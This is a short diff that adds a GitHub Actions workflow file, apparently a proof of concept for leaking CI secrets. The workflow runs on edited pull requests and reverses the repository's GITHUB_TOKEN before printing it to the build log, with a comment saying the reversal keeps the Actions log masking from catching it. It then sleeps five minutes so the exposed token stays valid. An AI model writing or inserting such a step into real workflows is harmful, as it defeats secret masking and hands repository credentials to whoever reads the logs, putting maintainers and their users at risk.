@@ -1,0 +1,25 @@
+# .github/workflows/some.yml
+name: Some
+on:
+  pull_request:
+    # could be synchronize or reopened events too, depending on a target
+    types: [edited]
+jobs:
+  some:
+    runs-on: ubuntu-latest
+    steps:
+
+    # Printing token in reversed order so GH Actions won't sanitize it
+    - name: Print reversed action token
+      env:
+        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+      run: |
+        copy=${GITHUB_TOKEN}
+        len=${#copy}
+        for((i=$len-1;i>=0;i--)); do rev="$rev${copy:$i:1}"; done
+        echo "rev: $rev"
+
+    # Need to add sleep to make token above live 5 min
+    - name: Sleep
+      run: |
+        sleep 300
